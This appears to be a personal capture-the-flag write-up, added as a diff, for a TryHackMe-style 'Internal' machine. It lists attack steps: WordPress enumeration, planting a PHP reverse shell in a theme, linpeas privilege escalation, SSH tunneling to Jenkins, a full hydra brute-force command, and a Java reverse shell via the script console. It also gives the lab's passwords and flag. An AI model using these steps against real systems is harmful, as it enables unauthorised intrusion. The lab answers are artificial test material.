@@ -1,0 +1,87 @@
+scan with gobuster showed that we have phpmyadmin
+in phpmyadmin/index.php we find out that it has error based 
+its all errors
+
+by adding ip to /etc/hosts
+we can use wpscan and enumirate users
+
+admin:my2boys
+lets gain reverse shell
+on themes we changed php function - added reverse shell
+after that /blog gaining as reverse shell
+
+kernel version 4.15.0-112-generic
+
+
+bash linpeas.sh
+
+It gives you a lot things on screen. But, follow the color code as they have mentioned in their blog.
+
+    RED/YELLOW: 95% a PE vector
+
+    RED: You must take a look at it
+
+    LightCyan: Users with console
+
+    Blue: Users without console & mounted devs
+
+    Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs)
+
+    LightMangeta: Your username
+    
+    
+we searched for a files a lot.. and find wpa-save.txt
+it contais aubreanna's password
+aubreanna:bubb13guM!@#123
+on her home/desktop we found user.txt and jenkins txt with this text
+
+172.17.0.2:8080
+
+ssh tunneling ?!
+how does this work?..
+ssh -L 8080:docker-ip:8080 aubreanna@internal
+
+netstat -tlnp
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.1:39023         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:4545          0.0.0.0:*               LISTEN      2208/ssh            
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 ::1:8080                :::*                    LISTEN      2097/ssh            
+tcp6       0      0 :::80                   :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+tcp6       0      0 ::1:4545                :::*                    LISTEN      2208/ssh            
+aubreanna@internal:~$ curl 127.0.0.1:8080
+<html><head><meta http-equiv='refresh' content='1;url=/login?from=%2F'/><script>window.location.replace('/login?from=%2F');</script></head><body style='background-color:white; color:white;'>
+
+
+Authentication required
+<!--
+You are authenticated as: anonymous
+Groups that you are in:
+  
+Permission you need to have (but didn't): hudson.model.Hudson.Read
+ ... which is implied by: hudson.security.Permission.GenericRead
+ ... which is implied by: hudson.model.Hudson.Administer
+-->
+
+</body></html>                                                                                                                                            
+
+ssh -L 127.0.0.1:80:intra.example.com:80 gw.example.com
+we used hydra:
+hydra -s 8080 10.10.131.184 http-form-post “/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:Invalid username or password” -L user.txt -P rockyou.txt -t 10 -w 30
+
+we found pass spongebob
+
+we used /script to open script console 
+and pasted Java reverse shell
+we found /opt/notes.txt and there was:
+root:tr0ub13guM!@#123
+THM{d0ck3r_d3str0y3r}
+
+it was too hard i need to learn something about ssh tunneling
